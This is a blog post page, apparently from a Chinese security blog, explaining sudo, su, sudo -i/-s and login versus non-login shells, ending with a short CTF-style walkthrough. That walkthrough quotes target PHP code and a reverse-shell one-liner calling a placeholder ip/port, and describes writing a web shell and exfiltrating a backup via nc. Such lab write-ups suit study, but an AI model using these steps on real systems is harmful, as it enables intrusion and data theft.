@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="basics," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Get root当我不小心在键盘输入了sudo su命令后，终端提醒我输密码，本着试试的心态输了进去。然后我就成为了Root。心里顿时一万个草泥马在奔腾，这是个啥情况？ 12341Person@ubuntu:~$ sudo su[sudo] password for 1Person:root@ubuntu:/home/1Person# whoamiroot Sudo &amp;amp; suSudo可以理">
+<meta name="keywords" content="basics">
+<meta property="og:type" content="article">
+<meta property="og:title" content="碰巧就成为root了？">
+<meta property="og:url" content="/2017-12-29-lucky-to-get-root/index.html">
+<meta property="og:site_name" content="Security blog">
+<meta property="og:description" content="Get root当我不小心在键盘输入了sudo su命令后，终端提醒我输密码，本着试试的心态输了进去。然后我就成为了Root。心里顿时一万个草泥马在奔腾，这是个啥情况？ 12341Person@ubuntu:~$ sudo su[sudo] password for 1Person:root@ubuntu:/home/1Person# whoamiroot Sudo &amp;amp; suSudo可以理">
+<meta property="og:updated_time" content="2017-12-31T13:42:48.551Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="碰巧就成为root了？">
+<meta name="twitter:description" content="Get root当我不小心在键盘输入了sudo su命令后，终端提醒我输密码，本着试试的心态输了进去。然后我就成为了Root。心里顿时一万个草泥马在奔腾，这是个啥情况？ 12341Person@ubuntu:~$ sudo su[sudo] password for 1Person:root@ubuntu:/home/1Person# whoamiroot Sudo &amp;amp; suSudo可以理">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2017-12-29-lucky-to-get-root/"/>
+
+
+
+
+
+  <title>碰巧就成为root了？ | Security blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017-12-29-lucky-to-get-root/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ꭰ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">碰巧就成为root了？</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-31T21:39:27+08:00">
+                2017-12-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Get-root"><a href="#Get-root" class="headerlink" title="Get root"></a><em>Get root</em></h3><p>当我不小心在键盘输入了<code>sudo su</code>命令后，终端提醒我输密码，本着试试的心态输了进去。然后我就成为了<em>Root</em>。心里顿时一万个草泥马在奔腾，这是个啥情况？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1Person@ubuntu:~$ sudo su</div><div class="line">[sudo] password for 1Person:</div><div class="line">root@ubuntu:/home/1Person# whoami</div><div class="line">root</div></pre></td></tr></table></figure>
+<h4 id="Sudo-amp-su"><a href="#Sudo-amp-su" class="headerlink" title="Sudo &amp; su"></a><em>Sudo &amp; su</em></h4><p><em>Sudo</em>可以理解为<em>Super user do</em>，执行<em>Sudo</em>命令时，系统会从<strong><em>/etc/sudoers</em></strong>读取配置，按照配置文件的信息来判断当前用户是否能够以<em>root</em>身份执行命令。当该命令被调用时，系统会要求输入<strong>当前用户的密码</strong>！</p>
+<p><em>su</em>命令可以理解为<em>switch user</em>或者<em>subtitute user</em>。<em>su [username]</em>命令会调用一个具有<em>username</em>权限的<em>shell instance</em>，此时系统会要求输入<strong>目标用户的密码</strong>。</p>
+<h4 id="Sudo-su"><a href="#Sudo-su" class="headerlink" title="Sudo su"></a><em>Sudo su</em></h4><p>调用<em>sudo su</em>的时候，<em>sudo</em>先被执行，系统根据<em>/etc/sudoers</em>来判断当前用户是否有权限以<em>root</em>来执行命令，如果调用<em>root</em>身份成功，接着就将以<em>root</em>身份执行<em>su</em>命令，所以不需要输入<em>root</em>密码。整个过程只需要输入当前用户的密码即可。</p>
+<h3 id="Difference-between-Login-non-login-interactive-and-non-interactive-shell"><a href="#Difference-between-Login-non-login-interactive-and-non-interactive-shell" class="headerlink" title="Difference between Login, non-login, interactive and non-interactive shell"></a><em>Difference between Login, non-login, interactive and non-interactive shell</em></h3><ul>
+<li><em>login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login a login shell.</em></li>
+<li><em>non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.</em></li>
+<li><em>interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.</em></li>
+<li><em>non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output</em></li>
+</ul>
+<h3 id="sudo-i-amp-sudo-s-amp-su-amp-su"><a href="#sudo-i-amp-sudo-s-amp-su-amp-su" class="headerlink" title="sudo -i &amp; sudo -s &amp; su &amp; su -"></a><em>sudo -i &amp; sudo -s &amp; su &amp; su -</em></h3><h4 id="su-amp-su"><a href="#su-amp-su" class="headerlink" title="su &amp; su -"></a><em>su &amp; su -</em></h4><p><em>su -</em>切换用户后会调用<em>login shell</em>，<em>login shell</em>会重置环境变量。</p>
+<p><em>su</em>只是切换用户(调用了一个<em>interactive non-login shell</em>)，环境变量和之前的用户一样未发生变化。</p>
+<p>假设我们以普通用户<em>1person</em>登录终端，并对<em>$PATH</em>进行了修改。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">[1person@host]$</span>  PATH="/tmp/test:$PATH"</div><div class="line"><span class="meta">[1person@host]$</span>  echo $PATH</div><div class="line">/tmp/test:/usr/bin.........</div><div class="line"><span class="meta">[1person@host]$</span>  su -</div><div class="line"><span class="meta">[root@host]#</span> echo $PATH</div><div class="line">/usr/bin.......</div><div class="line"><span class="meta">[root@host]$</span>  exit</div><div class="line"><span class="meta">[1person@host]$</span> su</div><div class="line">........</div><div class="line"><span class="meta">[root@host]#</span>  echo $PATH</div><div class="line">/tmp/test:/usr/sbin:/usr/bin.......</div></pre></td></tr></table></figure>
+<h4 id="sudo-i-amp-sudo-s"><a href="#sudo-i-amp-sudo-s" class="headerlink" title="sudo -i &amp; sudo -s"></a><em>sudo -i &amp; sudo -s</em></h4><p><em>sudo -i</em>会调用指定用户的账号密码进行登录，这意味着<em>.profile</em>和<em>.login</em>会被加载到新<em>shell</em>里。简单来说就是调用了一个<em>login shell</em>。</p>
+<p><em>sudo -s</em>则是运行指定<em>shell</em>环境变量的<em>shell</em>，如果未制定调用哪个<em>shell</em>环境变量，那么默认调用<em>interactive shell</em>。</p>
+<h3 id="sudo-su-的缘由"><a href="#sudo-su-的缘由" class="headerlink" title="sudo su -的缘由"></a><em>sudo su -</em>的缘由</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$dsn = <span class="string">'mysql:dbname=g0rmint;host=localhost'</span>;</div><div class="line">$pdo = <span class="keyword">new</span> PDO($dsn, <span class="string">'root'</span>, <span class="string">''</span>);</div><div class="line">$rooturl = <span class="string">"http://"</span> . $_SERVER[<span class="string">'SERVER_NAME'</span>] . <span class="string">"/g0rmint/"</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST)) &#123;</div><div class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">        <span class="keyword">if</span> (!is_array($value)) &#123;</div><div class="line">            $value = addslashes($value);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $_POST[$key] = $value;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addlog</span><span class="params">($log, $reason)</span> </span>&#123;</div><div class="line">    $myFile = <span class="string">"s3cr3t-dir3ct0ry-f0r-l0gs/"</span> . date(<span class="string">"Y-m-d"</span>) . <span class="string">".php"</span>;</div><div class="line">    <span class="keyword">if</span> (file_exists($myFile)) &#123;</div><div class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</div><div class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $fh = fopen($myFile, <span class="string">'w'</span>);</div><div class="line">        fwrite($fh, file_get_contents(<span class="string">"dummy.php"</span>) . <span class="string">"&lt;br&gt;\n"</span>);</div><div class="line">        fclose($fh);</div><div class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</div><div class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</div><div class="line">    &#125;</div><div class="line">    fclose($fh);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>为了绕过<em>addslash</em>函数，必须这样，在获得<em>shell</em>之前，我们先看下自己的权限和当前目录的权限，便于进一步的提升权限。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> shell_exec[cmd]; <span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span> shell_exec[<span class="string">'cmd'</span>]; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><em>PHP</em>的<em>shell_exec</em>无法直接执行<em>bash -i &amp;&gt;/dev/tcp/ip/port 0&gt;&amp;1</em>，所以我们这里需要写入一个<em>shell</em>文件。当前用户是<em>www-data</em>，在网站根目录下具有读写的权限，所以我们可以轻松写入并反弹<em>shell</em>。获取到<em>shell</em>后，在根目录下发现存在<em>backup.zip</em>文件，通过<em>nc</em>流将<em>backup.zip</em>下载至本地，发现存在数据库账号密码，最终通过前面提到的<em>sudo su -</em>获得了<em>root</em>权限。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>渗透是一场持久战，考验的是耐心和细心。赶在<em>2017</em>的尾巴上，<em>Happy Hacking</em>.</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><p><a href="https://askubuntu.com/questions/70534/what-are-the-differences-between-su-sudo-s-sudo-i-sudo-su" target="_blank" rel="external">What are the differences between “su”, “sudo -s”, “sudo -i”, “sudo su”?</a></p>
+</li>
+<li><p><a href="https://www.garron.me/en/linux/visudo-command-sudoers-file-sudo-default-editor.html" target="_blank" rel="external">Take Control of your Linux | sudoers file: How to with Examples</a></p>
+</li>
+<li><p><a href="https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used" target="_blank" rel="external">‘sudo su -‘ vs ‘sudo -i’ vs ‘sudo /bin/bash’ - when does it matter which is used, or does it matter at all?</a></p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/basics/" rel="tag"># basics</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017-12-24-Linux-redirection/" rel="next" title="Linux重定向">
+                <i class="fa fa-chevron-left"></i> Linux重定向
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ꭰ</p>
+              <p class="site-description motion-element" itemprop="description">Me. a lazy person</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jkme.github.io" title="jkme" target="_blank">jkme</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-root"><span class="nav-number">1.</span> <span class="nav-text">Get root</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sudo-amp-su"><span class="nav-number">1.1.</span> <span class="nav-text">Sudo & su</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sudo-su"><span class="nav-number">1.2.</span> <span class="nav-text">Sudo su</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Difference-between-Login-non-login-interactive-and-non-interactive-shell"><span class="nav-number">2.</span> <span class="nav-text">Difference between Login, non-login, interactive and non-interactive shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-i-amp-sudo-s-amp-su-amp-su"><span class="nav-number">3.</span> <span class="nav-text">sudo -i & sudo -s & su & su -</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#su-amp-su"><span class="nav-number">3.1.</span> <span class="nav-text">su & su -</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo-i-amp-sudo-s"><span class="nav-number">3.2.</span> <span class="nav-text">sudo -i & sudo -s</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-su-的缘由"><span class="nav-number">4.</span> <span class="nav-text">sudo su -的缘由</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ꭰ</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
